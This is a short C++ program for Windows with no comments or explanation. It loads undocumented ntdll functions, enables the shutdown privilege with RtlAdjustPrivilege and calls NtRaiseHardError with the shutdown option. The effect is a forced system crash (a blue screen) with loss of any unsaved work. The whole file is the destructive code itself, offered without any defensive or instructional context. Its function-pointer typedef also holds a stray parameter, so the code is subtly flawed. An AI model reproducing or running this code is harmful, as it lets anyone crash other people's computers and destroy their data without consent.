```#include <iostream>
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI * NtRaiseHardError_p)(NTSTATUS, ULONG, ULONG, OPTIONAL, PULONG_PTR, ULONG, PULONG);
typedef NTSTATUS(NTAPI * RtlAdjustPrivilege_p)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
int main()
{
    auto adjust_priv = (RtlAdjustPrivilege_p)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    auto raise_error = (NtRaiseHardError_p)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");
    auto status = adjust_priv(19, TRUE, FALSE, nullptr); 
    raise_error(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, nullptr); 
    return 0;
}
```
